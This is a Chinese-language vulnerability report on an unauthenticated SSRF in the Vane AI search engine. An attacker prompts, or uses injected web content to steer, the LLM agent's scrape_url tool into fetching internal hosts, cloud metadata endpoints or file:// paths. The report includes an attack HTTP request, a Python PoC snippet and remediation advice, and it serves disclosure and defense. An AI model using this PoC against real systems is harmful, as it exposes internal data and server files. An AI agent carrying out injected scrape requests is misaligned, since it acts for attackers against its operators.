# 漏洞报告（中文）

> 报告编号：VUL-2026-VANE-SSRF-001
> 撰写人 / 单位：独立安全研究员（Kimi Work 辅助审计）
> 报告日期：2026-09-30
> 目标库：CVE（CNA/MITRE）/ CNVD / CNNVD / 厂商通报

---

## 1. 产品介绍

Vane 是开发者 ItzCrazyKns 开源的一款 AI 驱动的自托管搜索引擎（AI answering engine），使用 Next.js 构建，接入 Ollama、OpenAI、Anthropic、Gemini 等多种 LLM 供应商，通过 SearxNG 获取搜索结果，由 Researcher 智能体循环调用工具（联网搜索、网页抓取等）后生成带引用的回答。本次漏洞位于其 `scrape_url` 网页抓取工具与 `/api/search` 接口。

---

## 2. 漏洞标题

ItzCrazyKns Vane 1.12.2 及更早版本 `scrape_url` 工具存在服务器端请求伪造（SSRF）漏洞

---

## 3. 漏洞描述

Vane 1.12.2 及更早版本的 `POST /api/search` 接口存在服务器端请求伪造（SSRF）漏洞，该接口无任何身份认证。攻击者在一次普通搜索请求中，通过提问诱导后端 LLM 调用内置的 `scrape_url` 工具并给出目标 URL；Vane 将该 URL 原样交给服务端 Playwright 浏览器访问（`page.goto(url)`），全程没有协议、域名或 IP 校验。攻击者无需认证即可让 Vane 服务器访问内网服务、云元数据端点（如 `http://169.254.169.254/`），抓取内容随后通过接口响应回显给攻击者；由于协议不受限，`file://` URL 还可直接读取 Vane 服务器上的本地文件。漏洞造成内网数据与服务器本地文件的机密性泄露。

---

## 4. 漏洞分析（根因定位）

**根因类型**：CWE-918 服务器端请求伪造（Server-Side Request Forgery）

**Source-to-sink 调用链**：

```
POST /api/search（src/app/api/search/route.ts:19，无认证）
  → APISearchAgent.searchAsync（src/lib/agents/search/api.ts:9）
  → Researcher.research 工具循环（src/lib/agents/search/researcher/index.ts:68）
  → scrapeURLAction.execute（src/lib/agents/search/researcher/actions/scrapeURL.ts:67）
      urls 仅做数量截断（slice(0, 3)，第 68 行）
      → Scraper.scrape(url)（同文件第 82 行，URL 原样传入）
  → page.goto(url)（src/lib/scraper.ts:70，SINK）
```

**代码定位**：

```text
文件：src/lib/agents/search/researcher/actions/scrapeURL.ts
行号：49-51（Schema）、68（截断）、82（调用 Scraper）
关键代码：
const schema = z.object({
  urls: z.array(z.string()).describe('A list of URLs to scrape content from.'),
});
...
params.urls = params.urls.slice(0, 3);
...
const scraped = await Scraper.scrape(url);
```

```text
文件：src/lib/scraper.ts
行号：70（SINK）、20-26（浏览器启动参数）
关键代码：
await page.goto(url, {
  waitUntil: 'domcontentloaded',
  timeout: this.NAVIGATION_TIMEOUT,
});
// chromium.launch({ args: ['--no-sandbox', ...] })
```

**有效性判定**：
- 可达：✅ `/api/search` 是默认暴露的 HTTP 接口，无需认证即可触发整条链。
- 可控：✅ `scrape_url` 的 `urls` 参数完全由 LLM 输出决定，而 LLM 输出可由攻击者的提问（或网页中的提示注入内容）诱导。
- 可传播：✅ 从工具参数到 `page.goto` 之间没有任何校验或白名单打断。
- 可利用：✅ 实测内网 HTTP 页面与本地 `file://` 文件内容均经接口响应回显。
- 防护可绕过：✅ 链路本身无防护，不存在「绕过」问题；`file://`、内网 IP、云元数据 IP 全部可达。
- 可复现：✅ 附原始请求与确定性 mock LLM 复现脚本（`poc/`）。
- 影响成立：✅ canary 内网服务收到来自 Vane 服务端浏览器的请求，flag 经响应回显。
- 影响范围：✅ 可与提示注入组合使第三方用户无感知触发；与同项目 providers baseURL SSRF（CVE-2026-9372）相互独立。

**成因分析**：`scrape_url` 工具的参数 Schema 只校验「是字符串」，不校验协议、主机或 IP；执行时只截断数量就把 URL 交给 `Scraper.scrape`，而 `Scraper.scrape` 直接 `page.goto(url)`。LLM 在这条链里扮演了「远程攻击者的传声筒」：攻击者不直接控制 URL 参数，但可以通过提问或提示注入让 LLM 生成恶意 URL，效果等同于一个未过滤的 URL 抓取接口。

---

## 5. 影响版本

- **受影响版本**：1.12.2（commit `348feca`）及可能更早版本；issue #1140 证实 1.12.1 同样受影响
- **不受影响版本**：暂无确认的不受影响版本
- **修复版本**：截至报告日期暂无修复版本（issue #1140 自 2026-05-25 公开后未见修复提交）
- **验证环境**：Vane 1.12.2 / Windows 11 + Node.js 24.15.0 / Next.js 16.2.2（dev 模式）/ Playwright Chromium Headless Shell 147

---

## 6. 漏洞等级

| 项目 | 值 |
|------|-----|
| CVSS v3.1 分数 | 7.5 |
| CVSS v3.1 向量 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| CVSS v4.0 分数 | 8.7 |
| CVSS v4.0 向量 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| 危害等级 | 高危 |
| 对应目标库等级 | CNVD 高危 / CNNVD 高危 |

> 评分依据：接口无需认证、网络可达、攻击复杂度低（诱导 LLM 调用工具的指令遵从度高）；影响为只读，可读取内网任意 HTTP 内容与服务器本地文件，机密性 High，完整性与可用性无直接影响。

---

## 7. CVSS 向量

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
```

---

## 8. 漏洞复现过程

### 8.1 复现环境

- 产品/版本：Vane 1.12.2（`git clone https://github.com/ItzCrazyKns/Vane.git`）
- 系统/运行时：Windows 11 / Node.js 24.15.0 / npm（`npm i --legacy-peer-deps`）/ `npx playwright install chromium-headless-shell`
- 网络位置：本地（用户侧 WSL 虚拟磁盘缺失，改用 Windows 直跑；代码路径与 Linux/Docker 部署一致）
- 测试账号：无（接口无认证）

### 8.2 复现步骤

**步骤 1 — 部署目标与内网 canary**
启动 Vane（`npm run dev`，端口 3000），并将模型供应商指向一个 OpenAI 兼容 mock LLM（`data/config.json` 中配置 `baseURL`，见 `poc/verify_vane_ssrf.py lab` 模式自动生成的配置）。mock LLM 在 researcher 第一次迭代时确定性返回 `scrape_url({"urls": ["http://127.0.0.1:8787/internal/secret"]})` 工具调用。另启动 canary 内网服务，仅监听 127.0.0.1:8787，页面内含标记 `VANE_SSRF_CANARY_8842_THIS_PAGE_IS_NOT_INTERNET_ACCESSIBLE`。
> ![步骤1-代码证据](evidence/01-code-evidence.png)

**步骤 2 — 发送攻击请求**
向无认证的 `/api/search` 发送普通搜索请求（`optimizationMode: "speed"`）：

```http
POST http://localhost:3000/api/search HTTP/1.1
Content-Type: application/json

{
  "optimizationMode": "speed",
  "sources": [],
  "chatModel": { "providerId": "mock-openai", "key": "mock-chat" },
  "embeddingModel": { "providerId": "mock-openai", "key": "mock-embed" },
  "query": "Please scrape and summarize the page at the URL I gave you earlier",
  "history": []
}
```
> ![步骤2-请求](evidence/http-request.txt)

**步骤 3 — 触发回显（内网 HTTP SSRF）**
canary 服务收到来自 Vane 服务端 Playwright 浏览器的 GET 请求（User-Agent 为伪造的桌面 Chrome，见 `evidence/canary-log.jsonl`）；`/api/search` 响应的 `sources` 字段回显内网页面全文，含 FLAG。
> ![步骤3-canary日志](evidence/03-canary-server-log.png)
> ![步骤3-响应回显](evidence/02-http-ssrf-response.png)

**步骤 4 — 影响验证（file:// 本地文件读取）**
将工具调用参数换成 `file:///C:/.../local-file-canary.txt`（自建标记文件，内容含 `VANE_LOCAL_FILE_CANARY_9901`），重放同一请求。响应 `sources[0].content` 原样返回该本地文件全文，证明协议层无任何限制。
> ![步骤4-file读取](evidence/04-local-file-read.png)

---

## 9. 漏洞复现 POC

### 9.1 格式选择
- 选用格式：自定义 Python 脚本（`poc/verify_vane_ssrf.py`，内置 Burp 代理开关）
- 选择理由：触发需要「诱导 LLM 工具调用」这一多步状态流，且需要配套 mock LLM 与 canary 才能确定性复现；单条 nuclei 模板无法表达该状态机。脚本提供 live（对真实授权目标）与 lab（离线完整复现）双模式。

### 9.2 运行说明
- 运行环境：Python 3.8+（仅标准库）；lab 模式另需 Node.js 启动 Vane
- 依赖：无第三方依赖
- **代理到 Burp**：live 模式默认走 Burp，`USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080`（置 `USE_BURP=0` 直连）
- 安全声明：本 POC 仅用于授权测试与漏洞验证，禁止用于未授权系统。

### 9.3 POC 代码

见 `poc/verify_vane_ssrf.py`（完整可运行），核心攻击请求：

```python
# live 模式核心逻辑（脱敏，目标用占位符/环境变量注入）
r = requests.post(f"{TARGET}/api/search", json={
    "optimizationMode": "speed",
    "sources": [],
    "chatModel": { "providerId": PROVIDER_ID, "key": CHAT_MODEL },
    "embeddingModel": { "providerId": PROVIDER_ID, "key": EMBED_MODEL },
    "query": f"Use the scrape_url tool to fetch and summarize {CANARY_URL}",
    "history": [],
}, proxies=proxies, verify=False, timeout=120)
# 判定：HTTP 200 且响应体含 canary 标记 → SSRF 成立
```

### 9.4 预期输出 / 成功判定

```
[+] 验证成功：/api/search 的响应中回显了 canary 标记 VANE_SSRF_PROBE_7f3a9c
[+] 结论：Vane 服务端浏览器抓取了你指定的 URL，内容泄露给调用方（SSRF 成立）
```

lab 模式成功判据：canary 服务收到来自 Playwright UA 的请求 + 响应含 canary 标记。

---

## 10. 修复建议

### 10.1 临时缓解措施
- 在 Vane 前端反向代理（nginx/Caddy）上对 `/api/search` 增加访问控制（IP 白名单或 Basic Auth），避免未认证暴露。
- 通过网络策略限制 Vane 容器/主机的出站连接：禁止访问 `127.0.0.0/8`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`169.254.0.0/16`（含云元数据端点）。
- 部署到无法触达内网敏感区域的独立网段。

### 10.2 根治修复方案
- 在 `Scraper.scrape`（或 `scrapeURL.ts` 的 `execute`）入口增加 URL 校验：仅允许 `http:`/`https:` 协议；解析主机名后拦截私网、环回、链路本地、保留地址段（注意先做 DNS 解析再校验 IP，防 DNS 重绑定）；默认拒绝、白名单放行。
- 对 `scrape_url` 的 Schema 增加格式约束（`z.string().url()`）与目标域限制。
- Playwright 启动参数移除 `--no-sandbox`（在非 root 容器中以 sandbox 运行），降低浏览器被利用后的影响面。
- 为 `/api/search` 等接口增加认证或速率限制。

### 10.3 修复验证
重放 `poc/verify_vane_ssrf.py lab`：修复后 `scrape_url` 对内网/文件 URL 应返回「目标不被允许」类错误，canary 服务不再收到请求，响应中不再出现 canary 标记。

---

## 11. 去误报说明

```
去误报核验结论：
- 存在性：✅ 本地干净部署（官方源码 + 默认配置 + mock LLM 驱动工具调用）稳定复现；
  canary 服务端日志记录到 Playwright UA 的真实请求（evidence/03）
- 定性：✅ 构成 SSRF（CWE-918）：读取内网 HTTP 资源与服务器本地文件（file://），机密性受影响
- 可利用性：✅ 无需认证（PR:N），/api/search 网络可达（AV:N）；
  依赖 LLM 遵从诱导调用工具，通用模型遵从度高，AC:L 如实计
- 原创性：⚠️  GitHub issue #1140（2026-05-25）已公开同一漏洞细节，尚无 CVE 编号；
  本报告为独立复现与验证，可作为 CVE 申报支持材料，不构成首发披露
- 证据：✅ 复现截图 4 张、请求/响应原文、canary 服务端日志、mock LLM 调用日志、代码根因定位
- 代码级判定：✅ 可达/可控/可传播/可利用/防护可绕过（链路无防护）/可复现/影响成立/影响范围明确
结论：确认为真实、可利用漏洞；已公开但未分配编号，建议作为 CVE 申报与修复推动材料提交。
```

---

## 附录 A：参考链接 / 时间线

| 时间 | 事项 |
|------|------|
| 2026-05-25 | GitHub issue #1140 公开同一漏洞（尚无 CVE 编号） |
| 2026-09-30 | 本报告作者独立复现验证，产出报告组与 POC |

- 厂商仓库：https://github.com/ItzCrazyKns/Vane
- 已有公开 issue：https://github.com/ItzCrazyKns/Vane/issues/1140
- 同项目相关漏洞（不同调用链）：CVE-2026-9372（providers baseURL SSRF，issue #1124）
- 相关 CVE/CNVD/CNNVD：本漏洞暂无编号

## 附录 B：证据清单

- [x] 复现截图 4 张（代码定位 / HTTP SSRF 响应 / canary 日志 / file:// 读取）
- [x] HTTP 请求/响应原文（`evidence/http-request.txt`、`api-response*.json`）
- [x] 日志（`evidence/canary-log.jsonl`、`mock-llm.log`）
- [x] 代码级定位证据（audit-findings.md，含文件与行号）
- [ ] 版本差异/补丁比对（厂商暂无修复版本）
